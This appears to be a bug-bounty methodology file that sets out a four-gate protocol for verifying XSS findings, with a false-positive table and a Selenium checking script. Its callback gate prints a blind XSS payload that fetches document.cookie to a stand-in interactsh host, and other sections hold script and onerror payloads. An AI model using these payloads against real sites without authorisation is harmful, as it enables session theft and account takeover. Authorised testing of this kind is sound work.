# Verification & Zero False Positive Protocol

## The 4-Gate System

Every candidate XSS finding must pass ALL 4 gates before being written up.

---

## Gate 1: Browser Execution
```bash
# Clean browser test
google-chrome --incognito --disable-extensions --disable-plugins
firefox --private-window --safe-mode
```

**Check for:**
- [ ] `alert()` dialog box visible
- [ ] `confirm()` dialog box visible
- [ ] `prompt()` dialog box visible
- [ ] `document.title` changed (for silent verification)
- [ ] Console output visible
- [ ] Network request to your callback server

**Fail if:**
- Only works with extensions installed → FALSE POSITIVE
- Only renders in DOM but doesn't execute (HTML-encoded) → NOT XSS
- Only triggers in dev console due to eval() → CONTEXT-ISSUE

---

## Gate 2: Callback Confirmation
```bash
# Start callback receiver
interactsh-client -v

# Inject blind XSS payload with interactsh URL
# Payload: <script>fetch('//YOUR_INTERACTSH/?c='+document.cookie)</script>

# Wait for callback (up to 60 seconds)
```

**Check for:**
- [ ] HTTP request received on callback server
- [ ] Cookie value present in request
- [ ] Page content or DOM data exfiltrated

**Fail if:**
- No callback received after 60s → likely blocked or not triggered
- Callback received but from unexpected source → verify IP/location

---

## Gate 3: Reproducibility
```bash
# Test in a completely clean environment
# Different browser OR incognito OR headless

# Test with fresh session (no cookies)
curl -sk -b /dev/null "https://target.com/vuln?param=<script>alert(1)</script>"
```

**Check for:**
- [ ] Works without any pre-existing state (logged out)
- [ ] Works in private/incognito mode
- [ ] Works with curl/wget (for non-DOM cases)

**Fail if:**
- Requires attacker to be logged in → SELF-XSS or AUTH-XSS
- Only works in specific browser version → OBSOLETE-ONLY
- Requires specific timing/race condition → UNRELIABLE

---

## Gate 4: Impact Assessment
```markdown
- [ ] Can steal session cookies (HttpOnly? Secure?)
- [ ] Can perform actions as victim (CSRF + XSS combo)
- [ ] Can access internal network (SSRF from XSS context)
- [ ] Can deface page
- [ ] Can redirect to phishing page
- [ ] Can capture keystrokes
- [ ] Has access to localStorage/sessionStorage
- [ ] Can modify page content permanently (stored vs reflected)
```

---

## False Positive Kill List

| Symptom | Verdict | Action |
|---------|---------|--------|
| Payload reflected in response but browser doesn't execute | NOT XSS (HTML-encoded) | Move on |
| Only works with `javascript:` in href and requires click | **Low severity only** | Consider if chained |
| Only triggers in DOM debugger/eval in console | NOT XSS | Move on |
| Requires victim to paste into console | NOT XSS | Move on |
| Works only with specific browser extension installed | FALSE POSITIVE | Move on |
| Only works in outdated browser (IE6) | Unlikely to be accepted | Check program scope |
| Self-XSS (requires attacker to be logged in as victim) | Usually out of scope | Check program policy |
| Only on error page (404/500) with reflected input | Usually not actionable | Move on |
| Alert fires but payload is truncated | Partial, check if still exploitable | Examine carefully |
| Works in browser but not with curl | May be DOM-based, test with headless browser | Use puppeteer/selenium |

---

## Automated Verification Script

```python
#!/usr/bin/env python3
"""
XSS Verification Script
Tests a URL with XSS payload and confirms execution.
"""
import sys
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

def verify_xss(url, payload, callback_url=None):
    opts = Options()
    opts.add_argument('--headless')
    opts.add_argument('--disable-extensions')
    opts.add_argument('--no-sandbox')
    opts.add_argument('--disable-gpu')
    
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(10)
    
    try:
        test_url = url.replace('PAYLOAD', payload)
        driver.get(test_url)
        time.sleep(2)
        
        # Check for alert
        try:
            alert = driver.switch_to.alert
            print(f"[+] ALERT DETECTED: '{alert.text}'")
            alert.accept()
            return True
        except:
            pass
        
        # Check for console errors
        logs = driver.execute_script("return window.console_logs || []")
        if logs:
            print(f"[+] Console logs: {logs}")
            
        # Check document.title change
        title = driver.title
        if 'XSS' in title or 'alert' in title:
            print(f"[+] Title mutated: {title}")
            return True
            
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        driver.quit()
    
    return False

if __name__ == '__main__':
    url = sys.argv[1]
    payload = sys.argv[2] if len(sys.argv) > 2 else '<img src=x onerror=alert(document.domain)>'
    
    if verify_xss(url, payload):
        print("[+] XSS CONFIRMED - ZERO FALSE POSITIVE")
    else:
        print("[-] No XSS detected")
```

## Final Pre-Report Check

Before writing any report:
- [ ] Passed Gate 1: Browser execution confirmed
- [ ] Passed Gate 2: Callback received (blind XSS) or alert verified (reflected/DOM)
- [ ] Passed Gate 3: Reproduced in clean environment
- [ ] Passed Gate 4: Meaningful impact identified
- [ ] In scope: Target/program accepts XSS
- [ ] Not duplicate: Check if this is a known/common endpoint
- [ ] Not blocked: WAF/Cloudflare didn't block the request
- [ ] Not encoded: Payload wasn't HTML-escaped/JS-escaped
